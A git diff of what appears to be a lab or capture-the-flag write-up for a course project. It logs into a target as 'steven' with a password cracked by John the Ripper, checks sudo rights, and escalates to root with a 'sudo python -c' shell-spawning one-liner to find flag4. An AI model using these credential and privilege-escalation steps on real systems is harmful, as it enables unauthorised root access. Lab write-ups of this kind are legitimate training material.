@@ -175,8 +175,22 @@ john --show wp_hashes.txt
 ![John-cracked](https://github.com/srabbers/Final-Project/blob/133ba819bd790cd0d8e4837572bb43c5721b3259/Diagrams-and-Media/John-cracked-hash.PNG)
 
 - Using the cracked password `pink84` we can now SSH into the user `Steven`
-  - Once SSH is successful we check the user for sudo privledges 
+  - Once SSH is successful we check the user for sudo priviledges 
 ```bash 
 ssh steven@192.168.1.110
 ``` 
 ![SSH-Steven](https://github.com/srabbers/Final-Project/blob/8acf5482b55bbb213250dbb1d55fa18df0fe0863/Diagrams-and-Media/SSH-via-user-steven.PNG)
+
+```bash 
+sudo -l
+``` 
+![Sudo-check](https://github.com/srabbers/Final-Project/blob/17df8aad6c66989e284c2075a89d0d4a9da40bdb/Diagrams-and-Media/Elevated-privileges.PNG)
+
+- Once we know the user has sudo access it is now possible for us to escalate our priviledges to `root` using python
+  - Searched through root directory for `flag4`
+   
+```bash 
+$ sudo python -c 'import os; os.system("/bin/sh")'
+``` 
+
+![root](https://github.com/srabbers/Final-Project/blob/17df8aad6c66989e284c2075a89d0d4a9da40bdb/Diagrams-and-Media/flag4.PNG)
